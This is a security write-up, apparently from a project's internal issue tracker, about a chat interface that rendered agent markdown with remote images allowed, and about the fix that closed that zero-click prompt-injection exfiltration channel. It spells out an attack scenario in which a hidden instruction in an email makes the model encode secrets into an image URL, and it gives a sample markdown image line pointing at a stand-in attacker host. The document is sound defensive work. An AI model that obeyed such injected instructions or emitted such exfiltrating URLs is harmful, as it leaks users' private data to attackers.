# Cockpit renders agent markdown with remote `<img>` allowed — a zero-click data-exfiltration channel for prompt injection

**Status:** **DONE — FIXED IN SOURCE + VERIFIED, 2026-07-17; deployment still required.** The pre-fix render path, permissive sanitizer posture, and missing `img-src` CSP were confirmed by code audit. The implemented fix preserves useful images without retaining the zero-click channel: every markdown image becomes an inert URL-review card and can be fetched only after an explicit per-image user action through an authenticated, SSRF-hardened backend. A platform `img-src 'self' blob: data:` CSP is the fail-closed backstop (`data:` preserves existing local file previews and cannot contact a remote origin). Unit, integration, real-network smoke, and Chromium/Firefox browser probes pass; the local host lacks the OS libraries required to launch Playwright WebKit.
**Found:** 2026-07-15, during the email-datasource research pass ([[project-email-datasource]] / `docs/features/email_datasource.md` "Security posture"). This is a **pre-existing, feature-independent platform vulnerability** — it exists today for any untrusted content the agent already ingests (web_search results, repo files, tool output). The email datasource does not create it; it makes it **acute** by adding the canonical injection source (an attacker-controlled inbox).
**Severity:** **High.** Zero-click exfiltration of anything in the agent's context window (other emails, datasource rows, repo/workspace files, KB/memory) to an attacker-controlled URL, triggered by a prompt injection in any untrusted content the agent summarizes or quotes. No user interaction beyond viewing the agent's reply. This is the exact mechanism behind Microsoft 365 Copilot **EchoLeak** (CVE-2025-32711), ChatGPT **ShadowLeak**, and **Superhuman AI** (Jan 2026) — the product this project is named after.
**Component:** cockpit Angular · `cockpit/src/app/core/markdown/external-image-extension.ts` · `cockpit/src/app/core/markdown/markdown-sanitizer.ts` · `cockpit/src/app/ui/external-image/external-image.directive.ts` · `cockpit/src/app/app.config.ts` · orchestrator `POST /api/media/remote-image` + `orchestrator/services/remote_image.py` · `docker/cockpit-nginx.conf` + `cockpit/angular.json`
**Related:** [[project-email-datasource]] (the doc that flagged this; its P0 "output-side egress control") · the draft-sanitization sibling concern (an agent-composed draft body with a tracking pixel fires when the user opens it to review — same channel, mail-client side)

## Summary

Before this fix, the cockpit rendered assistant/agent message content as markdown via `ngx-markdown`, relying on Angular's default `DomSanitizer`. That sanitizer strips scripts and event handlers but **permits `<img src="https://…">`**. Agent output is untrusted the moment the agent has read any untrusted input (an email body, a web page, a repo file). So an injected instruction that made the model emit:

```markdown
![](https://attacker.example/x?d=<base64 of secrets the agent just read>)
```

rendered an `<img>` whose `src` the browser **auto-fetched with zero clicks**, delivering the exfiltrated data in the URL. The pre-fix app shipped no `img-src` Content-Security-Policy to stop the fetch (the only CSP was `frame-ancestors 'none'`, which addresses clickjacking, not egress).

This is the completing leg of the **lethal trifecta** (private data + untrusted content + external communication): tier gating, folder allowlists, and "draft-not-send" defenses in the email design are all orthogonal to it — read access plus a rendering surface is already a full exfil path.

## The pre-fix vulnerability, in code

**1. Untrusted agent content is rendered as markdown.** Every assistant turn, summary, and answer flows through `<markdown [data]=…>`:

```
cockpit/src/app/views/persistent-chat/persistent-chat.component.ts
  807:  <markdown appCitationRef appKatex [data]="event.content" …>
  862:  <markdown appKatex [data]="turn.summary"></markdown>
  965:  <markdown appCitationRef appKatex [data]="answer" …>
 1007:  <markdown appCitationRef appKatex [data]="group.event.content" …>
```

**2. No image handling / sanitization is configured.** `provideMarkdown()` sets only gfm/breaks + the citation and KaTeX extensions — no DOMPurify, no image stripping, no `sanitize` override:

```
cockpit/src/app/app.config.ts:95-116  provideMarkdown({ markedOptions:{gfm,breaks}, markedExtensions:[citation, math] })
```

ngx-markdown defaults to Angular's `DomSanitizer` at `SecurityContext.HTML`, which **allows `<img>` with an arbitrary remote `src`** (it is not in the script/handler blocklist). Reference-style and inline markdown images both produce a live `<img>`.

**3. No CSP stops the outbound fetch.** The only Content-Security-Policy the cockpit serves is anti-framing:

```
docker/cockpit-nginx.conf:9   add_header Content-Security-Policy "frame-ancestors 'none'" always;
cockpit/angular.json:113       "Content-Security-Policy": "frame-ancestors 'none'"
```

There is no `img-src` / `connect-src` / `default-src` directive, so `https://attacker/...` loads unimpeded. A domain allowlist would **not** be sufficient anyway — Superhuman's exfil went through an *allowlisted* `docs.google.com` (Google Forms accepts arbitrary data via GET).

**4. The fix pattern already exists in this repo — applied to canvas, not chat.** The canvas renderer treats its rendered content as hostile and locks egress down completely:

```
cockpit/src/app/views/canvas/canvas-rendering.ts
   1:  import DOMPurify from 'dompurify';
  47:  "img-src 'none'; font-src 'none'; connect-src 'none'; form-action 'none'; " …   (STATIC_HTML_CSP)
 400:  DOMPurify.sanitize(parsed, {…})
 508:  DOMPurify.sanitize(source, {…})
cockpit/src/app/views/canvas/canvas-live-app-renderer.component.ts:124
        this.sanitizer.sanitize(SecurityContext.RESOURCE_URL, src)
```

The team already knows how to neutralize external-resource loading in untrusted rendered content. The gap is that the **chat/message markdown path — which renders the *actual* untrusted agent output — has none of it.**

## Why the email tiers don't save us

`docs/features/email_datasource.md` (Security posture) covers this in depth. In short: gating `send`, defaulting to `draft`, and the folder allowlist all constrain *email actions*; none touch the *rendered-output* channel. The moment the agent reads an injected body at the `read` tier and summarizes it into a reply the cockpit renders, the data is gone — no send required. (The mail-client-side sibling: an agent-composed **draft** body carrying a tracking pixel fires when the user opens the draft to review it, before any send. That's addressed separately by draft sanitization in the email doc.)

## Attack scenario (concrete)

1. Attacker emails the user; the body carries a hidden injection (white-on-white text / `display:none` / a reference-style markdown image template).
2. The user moves the mail into their `AI` folder (or an autonomous loop reads it) and asks the agent to "summarize my recent mail."
3. The injection instructs the model to base64 the content of the other messages it read and emit a markdown image `![](https://attacker/collect?d=<data>)`.
4. The cockpit renders the reply; the browser fetches the URL **zero-click**; the attacker's endpoint logs the query string. Done.

The same path worked pre-email with any untrusted content the agent ingested (a web_search result page, a poisoned repo README). Email merely guarantees a steady supply of attacker-controlled input.

## Fix strategy

Two complementary layers; do both.

- **Render path (primary):** stop the chat/message markdown renderer from emitting live remote resources. Options, in rough order of preference:
  1. A `marked` extension / post-render pass that **drops or neutralizes external image `src`** (and reference-style images) in agent output — e.g. rewrite to a click-to-load placeholder, or strip entirely. Reuse the canvas **DOMPurify** approach (`canvas-rendering.ts`) with an image-hostile config so there is one sanitization story in the codebase.
  2. Keep genuinely-needed images (if any — citations/math don't need remote `<img>`) behind an explicit click-to-load proxy; default-deny.
- **Platform (defense-in-depth):** add an **`img-src`/`connect-src` Content-Security-Policy** to the cockpit document (extend `docker/cockpit-nginx.conf:9` and `angular.json:113` beyond `frame-ancestors`). Even a permissive-but-bounded `img-src 'self' data:` blocks arbitrary remote fetches from rendered markdown while leaving app assets working. This is the backstop that catches any render-path miss (and any future new render surface).

Both are informed by the production fixes that actually stopped EchoLeak-class attacks (Google: "identifies external image URLs and will not render them"; Microsoft: link/image redaction + CSP hardening).

Related hardening tracked in the email doc, not here: draft-body sanitization before IMAP `APPEND`, and the approval/preview UI rendering previews with images blocked + URLs expanded.

## Approved implementation design (2026-07-17)

The product decision is to retain images behind **per-image informed consent**. There is deliberately no host allowlist or "always allow this domain" state: an attacker can encode data in a URL on an otherwise trusted host, so approval must apply to the exact URL the user can inspect.

1. **Neutralize before DOM insertion.** A global `marked` image renderer converts inline and reference-style markdown images into inert placeholders containing the escaped URL and alt text. It never emits `<img>`. The ngx-markdown sanitizer is replaced with DOMPurify configured to reject raw HTML resource-loading paths (`img`, `picture`, `source`, media/embed tags, SVG, `style`, and resource URL/style attributes). This ordering matters: replacing an `<img>` after it reaches the DOM is too late because the browser may already have started the request.
2. **Show a review card.** Every current Cockpit markdown surface enhances the inert placeholder into a card that shows the complete URL, identifies the destination host, warns when URL parameters are present, and offers **Copy URL** and **Load image once**. Merely rendering the card performs no network request.
3. **Fetch only after the click.** **Load image once** sends the exact reviewed URL in an authenticated, CSRF-protected POST to the orchestrator. The browser never assigns the remote URL to an element. The orchestrator accepts only public HTTPS destinations on port 443, rejects credentials and private/reserved/link-local IPs, validates and pins DNS results for the connection, re-applies the policy to every bounded redirect, sends no user cookies/referrer/auth headers, enforces time/byte/pixel limits, and accepts only verified raster image formats (no SVG/HTML). The returned bytes are displayed from a browser-memory `blob:` URL and revoked when the markdown rerenders or is destroyed.
4. **Keep a platform backstop.** The Cockpit document CSP becomes `frame-ancestors 'none'; img-src 'self' blob: data:`. App assets, browser-memory blobs, and existing local data-URL file previews continue to work, while any future missed remote `<img>` fails closed at the browser boundary. `data:` cannot create the outbound request this issue is about, and untrusted Markdown is independently forbidden from supplying image/resource elements or inline styles.

The proxy response is intentionally `private, no-store`; no remote URL, response, or approval is persisted server-side. "Once" means one explicit fetch for that rendered card, not a durable trust decision.

## Verification

- **Parser/sanitizer/card integration:** inline and reference-style images become inert placeholders; raw `<img>`, media, SVG, `src`/`srcset` and CSS URL paths are stripped; rendering a reviewed card makes zero HTTP requests; clicking sends the exact URL once and renders only the returned `blob:`. Covered by the new Cockpit specs; the complete Vitest run passes (91 files / 1,175 tests).
- **Backend security boundary:** URL/IP policy, mixed public/private DNS answers, connection pinning, unsafe redirects, declared/streamed size limits, raster decoding, auth-before-fetch, and no-store/nosniff response headers are covered by `tests/test_remote_image.py` (33 cases). The endpoint inventory classifies the new route as `gated:require_approved_user`.
- **Browser backstop:** the production-browser conformance suite injects a hostile remote `<img>` into the trusted parent document and observes the image error with **zero outbound requests**. All 20 Chromium/Firefox cases pass. WebKit was not runnable locally because the host lacks `libicu74` and `libjpeg-turbo8`.
- **Real fetch smoke:** the hardened fetcher resolved, downloaded, decoded, and identified Google's public 272×92 PNG (`image/png`, 5,969 bytes).
- **After deployment:** repeat the original collaborator probe through an actual agent reply. It should show the review card with no hit; a hit should occur only after **Load image once**. This is the remaining deployment-level confirmation, not an unresolved source-code question.

## Scope / priority

Independent of the email datasource and worth fixing on its own merits — it protects every existing untrusted-content path (web_search, repo, tool output). Once this source change is deployed, the Cockpit-side prerequisite for the email draft/send tiers is satisfied. Mail-client draft-body sanitization remains a separate requirement tracked in the email design.
